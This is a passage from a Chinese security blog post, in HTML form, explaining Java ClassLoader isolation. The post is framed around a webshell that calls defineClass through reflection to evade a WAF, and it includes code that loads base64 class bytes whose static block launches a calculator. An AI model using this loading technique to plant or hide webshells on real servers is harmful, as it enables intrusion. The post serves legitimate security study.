@@ -1,0 +1,594 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>ClassLoader的理解 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="ClassLoader的理解" />
+<meta property="og:description" content="1 前言补上上次星球无奖问答环节的坑。(本来北辰师傅在星球中没改马甲名字，后来才知道下面回答的是北辰师傅，emmmm尴尬尴尬) 起因是小伙伴在h" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/classloader%E7%9A%84%E7%90%86%E8%A7%A3/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-04-30T09:55:00+00:00" />
+<meta property="article:modified_time" content="2021-04-30T09:55:00+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="ClassLoader的理解"/>
+<meta name="twitter:description" content="1 前言补上上次星球无奖问答环节的坑。(本来北辰师傅在星球中没改马甲名字，后来才知道下面回答的是北辰师傅，emmmm尴尬尴尬) 起因是小伙伴在h"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/classloader%E7%9A%84%E7%90%86%E8%A7%A3/" /><link rel="prev" href="https://yzddmr6.com/posts/as-exploits-v12-update/" /><link rel="next" href="https://yzddmr6.com/posts/as-exploits-v13-update/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "ClassLoader的理解",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/classloader%E7%9A%84%E7%90%86%E8%A7%A3\/"
+        },"genre": "posts","wordcount":  1874 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/classloader%E7%9A%84%E7%90%86%E8%A7%A3\/","datePublished": "2021-04-30T09:55:00+00:00","dateModified": "2021-04-30T09:55:00+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#classloader的特性">ClassLoader的特性</a></li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">ClassLoader的理解</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-04-30">2021-04-30</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2021-04-30">2021-04-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1874 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#classloader的特性">ClassLoader的特性</a></li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>补上上次星球无奖问答环节的坑。(本来北辰师傅在星球中没改马甲名字，后来才知道下面回答的是北辰师傅，emmmm尴尬尴尬)</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177002213-9fb0c8ce-51fe-40b1-94e9-dc925eb8dbb1.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177002213-9fb0c8ce-51fe-40b1-94e9-dc925eb8dbb1.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177002213-9fb0c8ce-51fe-40b1-94e9-dc925eb8dbb1.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177002213-9fb0c8ce-51fe-40b1-94e9-dc925eb8dbb1.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177002213-9fb0c8ce-51fe-40b1-94e9-dc925eb8dbb1.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177002213-9fb0c8ce-51fe-40b1-94e9-dc925eb8dbb1.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>起因是小伙伴在hvv的过程中发现WAF会拦截Webshell中defineClass这个函数，因为反射可以把我们需要调用的方法放到一个字符串的位置，就可以产生各种变形，所以就想通过反射来绕过。</p>
+<p>于是乎就劈里啪啦写了这样一段代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Method defineClass = Class.forName(&#34;java.lang.ClassLoader&#34;).getDeclaredMethod(&#34;defineClass&#34;, String.class, byte[].class, int.class, int.class);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">defineClass.setAccessible(true);
+</span></span><span class="line"><span class="cl">defineClass.invoke(ClassLoader.getSystemClassLoader(), bytes, 0, bytes.length)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后发现第一次连接可以，第二次再刷新就会一直提示类重复加载的错误。</p>
+<p>其实这个问题主要涉及到对JAVA中类加载机制的理解，于是就引申出来另一个问题：为什么冰蝎跟蚁剑原来的shell就不会提示类重复加载的错误呢。在这篇文章里跟大家分享一下自己的理解。</p>
+<h2 id="classloader的特性" class="headerLink">
+    <a href="#classloader%e7%9a%84%e7%89%b9%e6%80%a7" class="header-mark"></a>2 ClassLoader的特性</h2><p>关于类加载机制已经有很多文章，在这个问题上主要涉及到其中一个知识点：</p>
+<p>一个类，如果由不同的类加载器实例加载的话，会在方法区产生两个不同的类，彼此不可见，并且在堆中生成不同Class实例。</p>
+<p>这里我们做一个小实验，首先写一个测试的目标类，就是简单的弹一个计算器。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">com</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">IOException</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">public</span> <span class="nx">class</span> <span class="nx">calc</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nf">calc</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">static</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">Runtime</span><span class="p">.</span><span class="nf">getRuntime</span><span class="p">().</span><span class="nf">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="nf">catch</span> <span class="p">(</span><span class="nx">IOException</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">e</span><span class="p">.</span><span class="nf">printStackTrace</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>编译然后获取class文件的base64结果，放入到下面代码中。</p>
+<p>需要注意的是，完成之后需要在idea中把上面弹计算器的类给删掉，这样才能模拟加载一个不存在类的效果。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">loader</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nx">Base64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">public</span> <span class="nx">class</span> <span class="nx">test1</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">class</span> <span class="nx">DefineLoader</span> <span class="nx">extends</span> <span class="nx">ClassLoader</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="nx">Class</span> <span class="nf">load</span><span class="p">(</span><span class="kt">byte</span><span class="p">[]</span> <span class="nx">bytes</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">super</span><span class="p">.</span><span class="nf">defineClass</span><span class="p">(</span><span class="nx">null</span><span class="p">,</span> <span class="nx">bytes</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">bytes</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">main</span><span class="p">(</span><span class="nx">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">String</span> <span class="nx">cls</span> <span class="p">=</span> <span class="s">&#34;yv66vgAAADQAJgoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAApMY29tL2NhbGM7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAHAEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAkACgcAIAwAIQAiAQAEY2FsYwwAIwAkAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAJQAKAQAIY29tL2NhbGMBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAgABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAUADQAAAAwAAQAAAAUADgAPAAAACAAQAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAIAAkACwAMAAkADQAKABEADAANAAAADAABAA0ABAARABIAAAATAAAABwACTAcAFAQAAQAVAAAAAgAW&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="p">[]</span> <span class="nx">bytes</span> <span class="p">=</span> <span class="nx">Base64</span><span class="p">.</span><span class="nf">getDecoder</span><span class="p">().</span><span class="nf">decode</span><span class="p">(</span><span class="nx">cls</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">DefineLoader</span> <span class="nx">defineLoader1</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">DefineLoader</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">defineLoader1</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="nx">bytes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="nf">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">e</span><span class="p">.</span><span class="nf">printStackTrace</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">DefineLoader</span> <span class="nx">defineLoader2</span> <span class="p">=</span><span class="nx">new</span> <span class="nf">DefineLoader</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">Class</span><span class="p">.</span><span class="nf">forName</span><span class="p">(</span><span class="s">&#34;com.calc&#34;</span><span class="p">,</span><span class="kc">true</span><span class="p">,</span><span class="nx">defineLoader1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="nf">catch</span> <span class="p">(</span><span class="nx">ClassNotFoundException</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">e</span><span class="p">.</span><span class="nf">printStackTrace</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行之后发现弹出了计算器，因为此时我们加载这个类的ClassLoader就是defineLoader1。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177825820-cc967fb6-3814-4a1a-86dc-7827f859f731.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177825820-cc967fb6-3814-4a1a-86dc-7827f859f731.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177825820-cc967fb6-3814-4a1a-86dc-7827f859f731.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177825820-cc967fb6-3814-4a1a-86dc-7827f859f731.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177825820-cc967fb6-3814-4a1a-86dc-7827f859f731.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177825820-cc967fb6-3814-4a1a-86dc-7827f859f731.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>接着修改Class.forname的类加载器为另一个defineLoader2再运行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">        try {
+</span></span><span class="line"><span class="cl">            Class.forName(&#34;com.calc&#34;,true,defineLoader2);
+</span></span><span class="line"><span class="cl">        } catch (ClassNotFoundException e) {
+</span></span><span class="line"><span class="cl">            e.printStackTrace();
+</span></span><span class="line"><span class="cl">        }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个时候因为使用的另一个不同的类加载器进行加载，所以就提示找不到这个类了</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177894463-e6256695-3dbd-4968-a516-a091eeecc66e.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177894463-e6256695-3dbd-4968-a516-a091eeecc66e.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177894463-e6256695-3dbd-4968-a516-a091eeecc66e.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177894463-e6256695-3dbd-4968-a516-a091eeecc66e.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177894463-e6256695-3dbd-4968-a516-a091eeecc66e.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177894463-e6256695-3dbd-4968-a516-a091eeecc66e.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>再做一个实验，打印两个Class的hashCode，发现两者确实是不同的。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">loader</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nx">Base64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">public</span> <span class="nx">class</span> <span class="nx">test1</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">class</span> <span class="nx">DefineLoader</span> <span class="nx">extends</span> <span class="nx">ClassLoader</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="nx">Class</span> <span class="nf">load</span><span class="p">(</span><span class="kt">byte</span><span class="p">[]</span> <span class="nx">bytes</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">super</span><span class="p">.</span><span class="nf">defineClass</span><span class="p">(</span><span class="nx">null</span><span class="p">,</span> <span class="nx">bytes</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">bytes</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">main</span><span class="p">(</span><span class="nx">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">String</span> <span class="nx">cls</span> <span class="p">=</span> <span class="s">&#34;yv66vgAAADQAJgoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAApMY29tL2NhbGM7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAHAEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAkACgcAIAwAIQAiAQAEY2FsYwwAIwAkAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAJQAKAQAIY29tL2NhbGMBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAgABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAUADQAAAAwAAQAAAAUADgAPAAAACAAQAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAIAAkACwAMAAkADQAKABEADAANAAAADAABAA0ABAARABIAAAATAAAABwACTAcAFAQAAQAVAAAAAgAW&#34;</span><span class="p">;</span>
